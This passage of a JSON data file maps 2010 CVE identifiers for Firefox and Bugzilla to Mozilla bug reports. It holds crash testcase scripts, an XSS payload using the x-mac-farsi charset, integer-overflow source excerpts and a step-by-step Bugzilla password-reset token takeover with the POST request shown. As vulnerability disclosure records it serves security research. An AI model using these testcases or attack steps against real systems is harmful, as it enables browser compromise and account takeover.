CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-3767": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=599468",
        "title": "NewIdArray Integer Overflow Remote Code Execution Vulnerability (ZDI-CAN-884)",
        "description": "ZDI-CAN-884: Mozilla Firefox NewIdArray Integer Overflow Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within Firefox's management of the JSSLOT_ARRAY_COUNT annotation. This value represents the number of items filled within a given Array object. If an attacker creates an array to a high enough value, an initialization routine can be made to mis-allocate a buffer. This can be abused by an attacker to corrupt memory and subsequently execute arbitrary code under the context of the user running the browser. Version(s) tested: Mozilla Firefox 3.6.6 Platform(s) tested: Windows XP SP3 x86 The value associated with JSSLOT_ARRAY_COUNT (below as \"num_properties\") is being used during the initialization phase of array content enumeration. From js/src/jsapi.cpp: JS_Enumerate(JSContext *cx, JSObject *obj) { jsint i, n; jsval iter_state, num_properties; jsid id; JSIdArray *ida; jsval *vector; ... /* Get the number of properties to enumerate. */ if (!obj->enumerate(cx, JSENUMERATE_INIT, &iter_state, &num_properties)) goto error; ... n = JSVAL_TO_INT(num_properties); ... /* Create an array of jsids large enough to hold all the properties */ ida = NewIdArray(cx, n); if (!ida) goto error; i = 0; vector = &ida->vector[0]; for (;;) { if (!obj->enumerate(cx, JSENUMERATE_NEXT, &iter_state, &id)) goto error; ... vector[i++] = id; } ... } So let's assume that num_properties = 0x3fffffff. NewIdArray(JSContext *cx, jsint length) { JSIdArray *ida; ida = (JSIdArray *) cx->malloc(offsetof(JSIdArray, vector) + length * sizeof(jsval)); if (ida) ida->length = length; return ida; } For offsetof(JSIdArray, vector) = 4, length = 0x3fffffff and sizeof(jsval) = 4 (32-bit x86) integer overflows and cx->malloc(0) call is made. Next, ida->length is set to huge positive value. Coming back to JS_Enumerate we can see that 0-byte long vector array will be overflown by indices values resulting in memory corruption. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-3768": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=527276",
        "title": "[@font-face] investigate support for OpenType sanitizer library",
        "description": "Google has published their OpenType sanitizer library: http://code.google.com/p/ots/ This library essentially validates OpenType fonts on a table-by-table basis, reconstructing each on the fly. Chromium tracking bug: http://code.google.com/p/chromium/issues/detail?id=17818 Integration into WebKit: https://bugs.webkit.org/show_bug.cgi?id=31106 The question here is whether this revalidation is worthwhile or whether it's just enforcing spec-correctness that doesn't actually guarantee safety."
      }
    ],
    "CVE-2010-3769": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=608336",
        "title": "CRITICAL BUG when calling document.write()",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) crashing after executing the following code from my test website with firefox 3.6.12: <script language=\"JavaScript\"> var m = \"6\"; for (var i = 0; i < 26; i++) { m = m + m; } document.write(m); </script> Reproducible: Always Steps to Reproduce: 1. create a file called crash.htm with the following content <script language=\"JavaScript\"> var m = \"6\"; for (var i = 0; i < 26; i++) { m = m + m; } document.write(m); </script> 2. doppelclick the file Actual Results: 0034a874 7684fdff 04000000 00000005 03d6e948 USP10!DoubleWideCharMappedString::DoubleWideCharMappedString+0x33 0034a954 76850f69 04000000 00000005 00000000 USP10!ScriptTokenize+0x4f 0034a990 76846248 0034af78 04000000 0034aa54 USP10!ScriptItemizeCommon+0x59 0034a9b4 555dc1a2 0034af78 04000000 00000005 USP10!ScriptItemize+0x38 WARNING: Stack unwind information not available. Following frames may be wrong. 0034aa6c 58348741 583e7ff8 00000000 0034ab28 xul!gfxTextRun::CopyGlyphDataFrom+0x5902 00000000 00000000 00000000 00000000 00000000 MOZCRT19!expand+0xa41"
      }
    ],
    "CVE-2010-3770": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=601429",
        "title": "x-mac-arabic, x-mac-farsi and x-mac-hebrew are vulnerable to XSS",
        "description": "x-mac-farsi exploit: <meta charset=\"x-mac-farsi\">ｼscript ｾalert(1)//ｼ/script ｾ I don't mark this bug as security sensitive because the exploit is already public (see the URL)."
      }
    ],
    "CVE-2010-3772": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=594547",
        "title": "Investigate crash downstream from [@nsTreeContentView::InsertRow]",
        "description": "wushi reported the following Firefox 3.6. crash to security@mozilla.org: ------- Hi, I think I found another exploitable vuln for firefox 3.6.8, the stack like this: (960.858): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=03c7de48 ebx=03c7de50 ecx=3ffdf793 edx=00000000 esi=03cffffc edi=03d00000 eip=7815023a esp=0012f68c ebp=0012f694 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Mozilla Firefox\\MOZCRT19.dll - MOZCRT19!memmove+0x5a: 7815023a f3a5 rep movs dword ptr es:[edi],dword ptr [esi] *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Mozilla Firefox\\xul.dll - ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong. 0012f694 100eab13 MOZCRT19!memmove+0x5a 0012f6b0 1076138d xul!gfxIntSize::gfxIntSize+0x49d7 0012f6d0 107613bf xul!gfxFontTestStore::NewStore+0x6cff 00000000 00000000 xul!gfxFontTestStore::NewStore+0x6d31 When you check the POC, you can found a lot of no-use things, these things just make the file size > 26k , To reproduce this case, maybe you need make your PC slowly and refresh some times ,haha. I can give you the dump file If you need . wushi"
      }
    ],
    "CVE-2010-3774": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=602780",
        "title": "about:neterror, certerror permit URL spoofing by being same-origin with about:blank",
        "description": "This demo should speak for itself: http://lcamtuf.coredump.cx/ffabout/ In essence, \"special\" about:neterror / about:certerror pages are reachable from about:blank - but are displayed in special contexts where the contents of the address bar point to the destination to which the browser attempted to navigate. This allows address bar spoofing, as shown in the PoC."
      }
    ],
    "CVE-2010-3776": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=569162",
        "title": "GC hazard with lookupProperty callers with scripted proxy handlers",
        "description": "lookupProperty and other object ops calls might not root obj."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=571995",
        "title": "Crash [@ BuildTextRunsScanner::BreakSink::SetBreaks(unsigned int, unsigned int, unsigned char*)] with crazy -moz-column testcase",
        "description": "No description provided."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=601699",
        "title": "Crash [@ nsSVGPathElement::GetMarkPoints]",
        "description": "No description provided."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=599166",
        "title": "potential overflow in xml_setNamespace",
        "description": "Fast native xml_setNamespace can write to vp[2] when argc == 0 Here is the relevant code: static JSBool xml_setNamespace(JSContext *cx, uintN argc, jsval *vp) { JSObject *qn; JSObject *ns; jsval qnargv[2]; JSXML *nsowner; NON_LIST_XML_METHOD_PROLOG; if (!JSXML_HAS_NAME(xml)) return JS_TRUE; xml = CHECK_COPY_ON_WRITE(cx, xml, obj); if (!xml) return JS_FALSE; ns = js_ConstructObject(cx, &js_NamespaceClass, NULL, obj, argc == 0 ? 0 : 1, Valueify(vp + 2)); if (!ns) return JS_FALSE; vp[0] = OBJECT_TO_JSVAL(ns); ns->setNamespaceDeclared(JSVAL_TRUE); qnargv[0] = vp[2] = OBJECT_TO_JSVAL(ns); qnargv[1] = OBJECT_TO_JSVAL(xml->name);"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=604843",
        "title": "\"ASSERTION: No text for IsSpace\" with wrapping inside table cell",
        "description": "###!!! ASSERTION: No text for IsSpace!: 'aPos < aFrag->GetLength()', file layout/generic/nsTextFrameThebes.cpp, line 627 ###!!! ASSERTION: bad index: 'PRUint32(aIndex) < mState.mLength', file nsTextFragment.h, line 204"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=468563",
        "title": "Another crash [@ GetChildListNameFor] with -moz-column, position:absolute",
        "description": "###!!! ASSERTION: out-of-flow is already in the destroy queue: 'aDestroyQueue.IndexOf(outOfFlowFrame) == kNotFound', file /Users/jruderman/central/layout/base/nsCSSFrameConstructor.cpp, line 9240 Crash [@ GetChildListNameFor] dereferencing 0xdddddddd, like in bug 411835."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=605307",
        "title": "nsGeolocation::ClearWatch crash",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6 Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6) Gecko/20100101 Firefox/4.0b6 Description: Calling watchPosition on the geolocation object with an object as argument followed by a clearWatch call leads to a crash. These crashes sometimes show exploitable behaviour ( arbitray writes ). Confirmed Versions: ----------------------- Firefox 4.0 beta 6 Firefox 3.6.10 Testcase: ------------------------ Smallest testcase: <script> o3=navigator; o7=new Error(); o15=o3.geolocation; o15.watchPosition(o7); try{o15.clearWatch(1);}catch(e){} </script> More likely to show exploitable behaviour: <script> o3=navigator; o7=new Error(); o15=o3.geolocation; for(var x=0; x<10;x++) o15.watchPosition(o7); for(var x=0; x<10;x++) try{o15.clearWatch(x+1);}catch(e){} </script> Testcase Notes: ----------------------- The testcase might need several reloads in the browser. Stack Backtrace: Linux: eax 0xa5a5a5a5 -1515870811 ecx 0xb7db6ff4 -1210355724 edx 0x0 0 ebx 0xb7db6ff4 -1210355724 esp 0xbfffd4c0 0xbfffd4c0 ebp 0xbfffd4e8 0xbfffd4e8 esi 0xbfffd614 -1073752556 edi 0x1 1 eip 0xb6ceaac7 0xb6ceaac7 <nsGeolocation::ClearWatch(int)+51> eflags 0x10286 [ PF SF IF RF ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 => 0xb6ceaac7 <_ZN13nsGeolocation10ClearWatchEi+51>: movb $0x1,0x29(%eax) 0xb6ceaacb <_ZN13nsGeolocation10ClearWatchEi+55>: xor %eax,%eax 0xb6ceaacd <_ZN13nsGeolocation10ClearWatchEi+57>: add $0xc,%esp Program received signal SIGSEGV, Segmentation fault. nsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979 warning: Source file is more recent than executable. 979 mWatchingCallbacks[aWatchId]->MarkCleared(); #0 nsGeolocation::ClearWatch (this=0xa7652b80, aWatchId=1) at /home/ubuntu/build/src/dom/src/geolocation/nsGeolocation.cpp:979 #1 0xb757e9ab in NS_InvokeByIndex_P () from /home/ubuntu/build/debug/dist/bin/libxul.so #2 0xb7018a8d in CallMethodHelper::Call() () from /home/ubuntu/build/debug/dist/bin/libxul.so #3 0xb701288c in XPCWrappedNative::CallMethod (ccx=..., mode=XPCWrappedNative::CALL_METHOD) at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednative.cpp:2304 #4 0xb701f2eb in XPC_WN_CallMethod (cx=0xaec27000, obj=0xaaa39f90, argc=2862849936, argv=0xb21fd428, vp=0xb21fd508) at /home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1738 #5 0xb7710d2a in callJSNative (cx=0xaec27000, fun=<value optimized out>, script=0x0, native=0xb701f18c <XPC_WN_CallMethod(JSContext*, JSObject*, unsigned int, jsval_layout*, jsval_layout*)>, argsRef=..., flags=2) Windows: (1b5c.13b8): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. xul!nsGeolocation::ClearWatch+0x1d: 5f12fde1 c6402501 mov byte ptr [eax+25h],1 ds:002b:6c6d7853=6c xul!nsGeolocation::ClearWatch+0x1d xul!NS_InvokeByIndex_P+0x27 xul!XPC_WN_CallMethod+0x886 MOZCRT19!arena_dalloc+0x39 xul!js::MonitorLoopEdge+0x87f xul!js::Interpret+0x24c0 xul!js::Execute+0x392 xul!JS_EvaluateUCScriptForPrincipals+0x59 xul!nsJSContext::EvaluateString+0x18a xul!nsScriptLoader::EvaluateScript+0x17c xul!nsScriptLoader::ProcessRequest+0xb2 xul!nsScriptLoader::ProcessScriptElement+0x2f3 xul!nsScriptElement::MaybeProcessScript+0x8c xul!nsHTMLScriptElement::MaybeProcessScript+0x1e xul!nsHTMLScriptElement::DoneAddingChildren+0xf xul!nsHtml5TreeOpExecutor::RunScript+0x7f xul!nsHtml5TreeOpExecutor::RunFlushLoop+0x2a1 xul!nsHtml5ExecutorReflusher::Run+0x11 xul!nsThread::ProcessNextEvent+0x17a xul!mozilla::ipc::MessagePump::Run+0x6e My reference # : d4f8755506e48534c2eb4dda39a054c1_1 VulnDev reference : vd10002 reported by nils of vulndev ltd. Reproducible: Always Steps to Reproduce: 1. save testcase to html file 2. load testcase 3. crash Actual Results: crash Expected Results: no crash"
      }
    ],
    "CVE-2010-3777": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=599607",
        "title": "js_MakeArraySlow from 1.9.2 and 1.9.1 is GC-unsafe on 64-bit",
        "description": "On 1.9.2 and 1.9.1 branches the dense array capacity can grow beyond JSID_INT_MAX (2**32 - 1) as the capacity limit is set to 2**word_size/sizeof(jsval). Thus on these branches with 64 bit CPU, when js_MakeArraySlow loops over all elements, it may reach indexes that goes beyond JSID_INT_MAX. For such indexes JS_ValueToId convert them into strings. The latter could trigger the last-ditch GC. That GC will collect JSScopeProperty instances that are added to the just created scope since the scope is not reachable through any object leading to a GC hazard. In practice this can only be exploitable if one can allocate more than 8GB array which requires very high end hardware and patience to wait for an exploit to fill the array before killing the browser. On the trunk the array capacity limit is set to 2*32/sizeof(jsval) or 2*29 so JS_ValueToId from makeDenseArraySlow cannot allocate any GC things. Still the implementation for the bug 569422 need to be aware of this as the proposed changes there allocates shapes as GC things leading to a possibility of the last-ditch GC for any array."
      }
    ],
    "CVE-2010-3778": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=411835",
        "title": "Crash [@ GetChildListNameFor] with -moz-column, position:absolute",
        "description": "Loading the testcase makes Firefox crash [@ GetChildListNameFor] dereferencing 0xdddddddd."
      }
    ],
    "CVE-2010-4567": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=619588",
        "title": "[SECURITY] Safety checks that disallow clicking for javascript: or data: URLs in the URL field can be evaded with prefixed whitespace",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13 Build Identifier: Inspired by bug 619566, I felt compelled to file a bug with a more believable testcase for an XSS flaw (as in, anyone who reads the bug URL realizes it's an XSS attempt). Reproducible: Always Steps to Reproduce: 1. Click the bug URL provided Actual Results: It alerts my document cookies Expected Results: Input such as that should be filtered before actually going into the database."
      }
    ],
    "CVE-2010-4568": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=619594",
        "title": "[SECURITY] Tokens generated from weak source of randomness, allowing an attacker to guess a password change token and change the password of any account",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101212 Gentoo Firefox/3.6.13 Build Identifier: Bugzilla-3.6.3, as well as the version running on bugzilla.mozilla.org To Whom It May Concern, the Bugzilla 3.6.3, the bugzilla.mozilla.org website, and likely other versions and instances of Bugzilla contain a critical vulnerability that can be used to recover a password reset token for any account. An attacker with an account on the bugzilla system can request a password reset for any other account and through efficient bruteforce recover the token, the attacker can use the token to changethe password of the victim's account and login as the victim. A Quick explanation. Bugzilla uses rand and srand in perl, which are based on srand48 and drand48 on Linux (and possibly other OS's) srand48 is seeded with at most 32 bit of entropy. Using a modern machine one can go through these 32bits in a very short amount of time, less than 10 minutes on my machine. Bugzilla uses (s)rand to generate their tokens and to generate their login cookie. When accessing token.cgi with the attackers login credentials Bugzilla will login the attacker and send him a login cookie made using generate_random_password, the attacker can recover the seed used for srand from this, and use it to know the full internal state of the random number generator. The same request is used by the attacker to request a password reset for the account the attackers wants to take over. For the reset procedure a token will be generated and send to the victim, if the attacker can find this token he can reset the victims password. Since the token is also created using generate_random_password and uses the internal random state that was left after making the login cookie the attacker can easily deduce the token send to the victim. Steps for a succesful attack: request a password reset for the victim account, while logging into to Bugzilla: POST /token.cgi --- Bugzilla_login=<ATTACKER_LOGIN>&Bugzilla_password=<ATTACKER_PASSWORD>&Bugzilla_remember=on&loginname=<VICTIMLOGINNAME>&a=reqpw the response from the server will contain: Set-Cookie: Bugzilla_logincookie=LPfN86mTdY; path=/; expires=Fri, 01-Jan-2038 00:00:00 GMT; secure; HttpOnly while the victim will be sent an email with a token in it. Next the attacker finds the random state used to generate his login Cookie and calculates the next token that BugZilla generated: ./randfindclean LPfN86mTdY found at seed: -43631713 // fd663b9f YKWG0y4oQT (randfindclean finds the seed used to make the logincookie, and then calculates the token based on rand state) and uses the token to login as the victim and change their password. ---- copy paste from the victims email --- You have (or someone impersonating you has) requested to change your Bugzilla password. To complete the change, visit the following link: https://bugzilla.mozilla.org/token.cgi?t=YKWG0y4oQT&a=cfmpw ----- If there are any questions, please don't hesitate to contact me, Willem Pinckaers. Reproducible: Always Steps to Reproduce: 1.login while requestion a password change for the victim 2.based on logincookie, calculate the password token 3.change the victim password and login as the victim Actual Results: Got access to the victim's account Expected Results: r"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621591",
        "title": "Critical Security Issue In Bugzilla Since 2.14: Early-Access Patch",
        "description": "Dear Bugzilla Admins, A critical security issue has been discovered in Bugzilla, and we are offering you an early-access patch so that you can patch your Bugzilla before we publicly disclose the issue. This issue affects Bugzilla versions 2.14 and higher. The impact of the issue is that a user could gain unauthorized access to any Bugzilla account in a very short amount of time (short enough that the attack is highly effective). The patch currently attached to this bug is only a preliminary patch--the final patch released with the security advisory will be much more extensive. You will have to revert this patch before upgrading to the security release. We are aware that, under normal circumstances, what this patch looks to be doing is a bad idea--one should not normally call srand() more than once per process. However, we assure you that for now, it will protect your Bugzilla from this security issue being exploited until a more extensive fix can be provided. There is one slight exception--if you have Bugzilla installed on Windows, then this patch will not resolve the issue, and you will have to wait for the final security advisory and complete patch. Please avoid exposing the existence of this issue or this patch until we have a final patch and a public security advisory. (In other words, don't check this patch into any publicly-available version-control repository, don't advertise its contents, etc.)"
      },
      {
        "url": "https://bugzilla.mozilla.org/attachment.cgi?id=506031&action=diff",
        "description": "Dear Bugzilla Admins, A critical security issue has been discovered in Bugzilla, and we are offering you an early-access patch so that you can patch your Bugzilla before we publicly disclose the issue. This issue affects Bugzilla versions 2.14 and higher. The impact of the issue is that a user could gain unauthorized access to any Bugzilla account in a very short amount of time (short enough that the attack is highly effective). The patch currently attached to this bug is only a preliminary patch--the final patch released with the security advisory will be much more extensive. You will have to revert this patch before upgrading to the security release. We are aware that, under normal circumstances, what this patch looks to be doing is a bad idea--one should not normally call srand() more than once per process. However, we assure you that for now, it will protect your Bugzilla from this security issue being exploited until a more extensive fix can be provided. There is one slight exception--if you have Bugzilla installed on Windows, then this patch will not resolve the issue, and you will have to wait for the final security advisory and complete patch. Please avoid exposing the existence of this issue or this patch until we have a final patch and a public security advisory. (In other words, don't check this patch into any publicly-available version-control repository, don't advertise its contents, etc.)"
      }
    ],
    "CVE-2010-4569": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=619637",
        "title": "[SECURITY] XSS in user autocomplete due to lack of encoding by YUI",
        "description": "If a user's real name field happens to contain XSS, the user autocomplete UI will happily execute it, as it does no escaping of any potential valid HTML. http://yuilibrary.com/forum/viewtopic.php?p=12923 talks about the problem somewhat."
      }
    ],
    "CVE-2010-4570": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=619648",
        "title": "[SECURITY] XSS via summary in \"possible duplicates\" table due to lack of encoding by YUI",
        "description": "I haven't confirmed that this actually is valid, but from what crazy YUI stuff I've seen in the last hour, I suspect it probably is."
      }
    ],
    "CVE-2010-4572": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=621572",
        "title": "[SECURITY] chart.cgi vulnerable to header-injection due to use of |print \"Location:\"| instead of $cgi->redirect",
        "description": "Found in chart.cgi: print \"Location: query.cgi?format=\" . $cgi->param('query_format') . ($params ? \"&$params\" : \"\") . \"\\n\\n\"; print \"Location: buglist.cgi\" . ($params ? \"?$params\" : \"\") . \"\\n\\n\"; We should use $cgi->redirect instead."
      }
    ]
  }
}